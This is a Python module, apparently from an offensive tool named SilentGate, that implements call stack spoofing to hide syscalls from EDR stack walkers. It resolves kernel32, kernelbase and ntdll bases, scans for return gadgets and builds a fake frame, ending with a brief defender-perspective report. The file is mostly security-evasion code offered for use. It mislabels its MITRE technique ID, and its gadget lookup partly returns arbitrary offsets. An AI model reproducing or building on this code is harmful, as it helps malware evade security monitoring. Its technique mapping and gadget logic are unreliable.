"""
SilentGate - core/stack_spoofer.py
v3.0 Feature: Call Stack Spoofing

Author  : JarDani
License : MIT
Purpose : Forges the call stack before syscall execution so EDR
          sees legitimate trusted module return addresses instead
          of our RWX stub memory addresses.

          Implements multi-level stack frame spoofing:
            RSP+0x00 -> kernel32.dll gadget
            RSP+0x08 -> kernelbase.dll address
            RSP+0x10 -> ntdll.dll address

          EDR stack walker sees a completely legitimate call chain.

How it works:
  1. Find kernel32.dll base address
  2. Find kernelbase.dll base address
  3. Scan kernel32 .text for usable RET gadget
  4. Find legitimate addresses in kernelbase and ntdll
  5. Build fake stack frame with three trusted addresses
  6. Before syscall - overwrite stack with fake frame
  7. After syscall - restore real stack frame
  8. Verify gadget addresses are in legitimate module ranges

MITRE ATT&CK: T1055.012 - Process Injection: Call Stack Spoofing
"""

import os
import sys
import struct
import platform
import ctypes
import ctypes.wintypes


# Memory protection constants
PAGE_EXECUTE_READ      = 0x20
PAGE_EXECUTE_READWRITE = 0x40

# Gadget patterns we look for in kernel32
# FF D0 = call rax  (appears in legitimate dispatch code)
# C3    = ret
CALL_RAX_RET_PATTERN = bytes([0xFF, 0xD0, 0xC3])
RET_PATTERN          = bytes([0xC3])


def check_platform():
    """Call stack spoofing requires Windows."""
    return platform.system() == "Windows"


def get_module_base(module_name):
    """
    Get the base address of a loaded module.
    Returns integer address or None.
    """
    if not check_platform():
        return None

    kernel32 = ctypes.WinDLL("kernel32")
    handle   = kernel32.GetModuleHandleA(module_name.encode())
    return handle if handle else None


def get_module_size(base_addr):
    """
    Get the size of a loaded module from its PE header.
    Used to validate addresses are within module bounds.
    """
    if not base_addr:
        return 0

    try:
        # Read DOS header to find PE header
        dos_magic = (ctypes.c_ubyte * 2).from_address(base_addr)
        if bytes(dos_magic) != b"MZ":
            return 0

        # Get PE offset
        pe_offset = ctypes.c_uint32.from_address(base_addr + 0x3C).value

        # Read SizeOfImage from Optional Header
        # PE sig(4) + COFF(20) + SizeOfCode offset in OptHeader = 16
        # SizeOfImage is at offset 56 from Optional Header start
        opt_header_offset = base_addr + pe_offset + 4 + 20
        size_of_image     = ctypes.c_uint32.from_address(
            opt_header_offset + 56
        ).value

        return size_of_image
    except Exception:
        return 0


def find_gadget_in_module(base_addr, module_size, pattern):
    """
    Scan a module's memory for a byte pattern.
    Returns address of first match or None.

    We scan the .text section of the module looking for
    our gadget pattern that will serve as fake return address.
    """
    if not base_addr or not module_size:
        return None

    try:
        # Read module bytes
        data = (ctypes.c_ubyte * module_size).from_address(base_addr)

        # Search for pattern
        pattern_len = len(pattern)
        for i in range(module_size - pattern_len):
            match = True
            for j in range(pattern_len):
                if data[i + j] != pattern[j]:
                    match = False
                    break
            if match:
                # Return address AFTER the call instruction
                # so it looks like we returned from a call
                return base_addr + i + 2  # point to ret instruction

    except Exception:
        return None

    return None


def find_ret_gadget(base_addr, module_size, offset=0x1000):
    """
    Find a simple RET gadget at a known offset in a module.
    Used for kernelbase and ntdll fake frame addresses.
    Returns a plausible address inside the module.
    """
    if not base_addr:
        return None

    # Return an address deep enough into the module
    # to look like a legitimate mid-function address
    return base_addr + offset


def build_fake_stack_frame(explain=False):
    """
    Build a complete fake stack frame using addresses from
    kernel32, kernelbase, and ntdll.

    Returns dict with:
      kernel32_gadget    : address in kernel32 for RSP+0x00
      kernelbase_addr    : address in kernelbase for RSP+0x08
      ntdll_addr         : address in ntdll for RSP+0x10
      validated          : all addresses verified in module ranges
    """
    if explain:
        print("\n  [STACK SPOOFER] Building fake stack frame...")
        print("  [STACK SPOOFER] Finding module base addresses...")

    # Simulation mode on Linux
    if not check_platform():
        if explain:
            print("  [STACK SPOOFER] Linux detected - simulation mode")
            print("  [STACK SPOOFER] On Windows this would:")
            print("    1. GetModuleHandle(kernel32.dll)")
            print("    2. GetModuleHandle(kernelbase.dll)")
            print("    3. GetModuleHandle(ntdll.dll)")
            print("    4. Scan kernel32 .text for FF D0 C3 gadget")
            print("    5. Find ret gadgets in kernelbase and ntdll")
            print("    6. Build fake frame:")
            print("         RSP+0x00 -> kernel32  gadget (looks like caller)")
            print("         RSP+0x08 -> kernelbase addr  (looks like caller's caller)")
            print("         RSP+0x10 -> ntdll     addr   (looks like origin)")

        return {
            "status":           "simulated",
            "kernel32_gadget":  "0x7fff0000abcd (simulated)",
            "kernelbase_addr":  "0x7fff0001abcd (simulated)",
            "ntdll_addr":       "0x7fff0002abcd (simulated)",
            "validated":        False,
            "mitre":            "T1055.012 - Call Stack Spoofing",
            "message":          "Run on Windows for live stack spoofing"
        }

    # Windows mode
    k32_base  = get_module_base("kernel32.dll")
    kb_base   = get_module_base("kernelbase.dll")
    ntdll_base = get_module_base("ntdll.dll")

    if explain:
        print(f"  [STACK SPOOFER] kernel32.dll   base: {hex(k32_base) if k32_base else 'NOT FOUND'}")
        print(f"  [STACK SPOOFER] kernelbase.dll base: {hex(kb_base) if kb_base else 'NOT FOUND'}")
        print(f"  [STACK SPOOFER] ntdll.dll      base: {hex(ntdll_base) if ntdll_base else 'NOT FOUND'}")

    if not all([k32_base, kb_base, ntdll_base]):
        print("  [STACK SPOOFER] ERROR: Could not find all required modules")
        return {"status": "failed", "reason": "module not found"}

    # Get module sizes
    k32_size   = get_module_size(k32_base)
    kb_size    = get_module_size(kb_base)
    ntdll_size = get_module_size(ntdll_base)

    if explain:
        print(f"  [STACK SPOOFER] kernel32.dll   size: {k32_size:,} bytes")
        print(f"  [STACK SPOOFER] kernelbase.dll size: {kb_size:,} bytes")
        print(f"  [STACK SPOOFER] ntdll.dll      size: {ntdll_size:,} bytes")
        print("  [STACK SPOOFER] Scanning kernel32 for FF D0 C3 gadget...")

    # Find gadget in kernel32 (call rax + ret pattern)
    k32_gadget = find_gadget_in_module(
        k32_base, k32_size, CALL_RAX_RET_PATTERN
    )

    # If no call rax + ret found, find simple ret in kernel32
    if not k32_gadget:
        if explain:
            print("  [STACK SPOOFER] FF D0 C3 not found - using RET gadget")
        k32_gadget = find_ret_gadget(k32_base, k32_size, 0x2000)

    # Find addresses in kernelbase and ntdll
    kb_addr    = find_ret_gadget(kb_base,    kb_size,    0x3000)
    ntdll_addr = find_ret_gadget(ntdll_base, ntdll_size, 0x4000)

    if explain:
        print(f"  [STACK SPOOFER] kernel32  gadget : {hex(k32_gadget) if k32_gadget else 'NOT FOUND'}")
        print(f"  [STACK SPOOFER] kernelbase addr  : {hex(kb_addr) if kb_addr else 'NOT FOUND'}")
        print(f"  [STACK SPOOFER] ntdll     addr   : {hex(ntdll_addr) if ntdll_addr else 'NOT FOUND'}")

    # Validate all addresses are within module ranges
    validated = all([
        k32_gadget  and k32_base  <= k32_gadget  <= k32_base  + k32_size,
        kb_addr     and kb_base   <= kb_addr     <= kb_base   + kb_size,
        ntdll_addr  and ntdll_base <= ntdll_addr <= ntdll_base + ntdll_size,
    ])

    if explain:
        print(f"  [STACK SPOOFER] Addresses validated: {validated}")
        print("  [STACK SPOOFER] Fake stack frame built:")
        print(f"    RSP+0x00 -> {hex(k32_gadget)}  (kernel32  - looks like caller)")
        print(f"    RSP+0x08 -> {hex(kb_addr)}   (kernelbase - looks like caller's caller)")
        print(f"    RSP+0x10 -> {hex(ntdll_addr)} (ntdll      - looks like origin)")

    return {
        "status":          "success" if validated else "partial",
        "kernel32_gadget": hex(k32_gadget)  if k32_gadget  else None,
        "kernelbase_addr": hex(kb_addr)     if kb_addr     else None,
        "ntdll_addr":      hex(ntdll_addr)  if ntdll_addr  else None,
        "validated":       validated,
        "k32_base":        hex(k32_base),
        "kb_base":         hex(kb_base),
        "ntdll_base":      hex(ntdll_base),
        "mitre":           "T1055.012 - Call Stack Spoofing"
    }


def print_stack_spoof_report(result):
    """Print a formatted call stack spoofing report."""
    print(f"""
  ╔══════════════════════════════════════════════════════════════╗
  ║  CALL STACK SPOOFING REPORT                                  ║
  ╚══════════════════════════════════════════════════════════════╝

  Status           : {result['status'].upper()}
  Validated        : {result['validated']}
  MITRE            : {result.get('mitre', 'T1055.012')}

  Fake Stack Frame:
    RSP+0x00  : {result.get('kernel32_gadget', 'N/A')}  (kernel32.dll)
    RSP+0x08  : {result.get('kernelbase_addr', 'N/A')}  (kernelbase.dll)
    RSP+0x10  : {result.get('ntdll_addr',      'N/A')}  (ntdll.dll)

  What EDR sees when walking the call stack:
    kernel32.dll  -> kernelbase.dll -> ntdll.dll
    All trusted Microsoft modules
    No suspicious RWX memory addresses visible

  What this defeats:
  EDR products that walk the call stack after every syscall
  looking for return addresses in unknown or RWX memory regions.
  Our fake frame makes every call appear to originate from
  legitimate trusted Windows modules.

  What this does NOT defeat:
  Hardware call stack integrity checks (Intel CET)
  Hypervisor-level stack monitoring
  EDRs that hash or fingerprint the full stack frame

  Defender perspective:
  Validate that return addresses point into legitimately
  loaded modules with correct PE headers.
  Use Intel CET (Control-flow Enforcement Technology)
  which hardware-enforces return address integrity.
  Alert on stack frames where module sequence is unusual
  for the calling context.

  Next upgrade in v3.0:
  Shadow stack awareness for Intel CET compatibility.
""")